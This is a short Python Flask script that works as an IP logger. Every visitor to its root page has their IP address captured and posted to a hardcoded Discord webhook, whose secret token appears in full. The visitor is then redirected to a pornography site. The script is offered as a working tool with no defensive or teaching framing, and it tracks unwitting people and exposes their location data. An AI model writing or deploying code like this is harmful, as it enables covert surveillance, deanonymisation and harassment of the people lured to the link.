from flask import Flask, request, redirect
import requests

app = Flask(__name__)


WEBHOOK_URL = "https://discord.com/api/webhooks/1342987990468923464/iIGYeSKvM6ZiRp1jCr4WIv1NhXc-FWCbrXX9VuMjE2s8cqy9GOmW78pRPNWgGWP3oFr8"

# 🔗 Website to redirect to
REDIRECT_URL = "https://www.pornhub.com"  

@app.route('/')
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)  
    requests.post(WEBHOOK_URL, json={"content": f"🌐**IP:** `{ip}`"})
    
    return redirect(REDIRECT_URL)  
  
if __name__ == '__main__':
    app.run(host='0.0.0.0')  
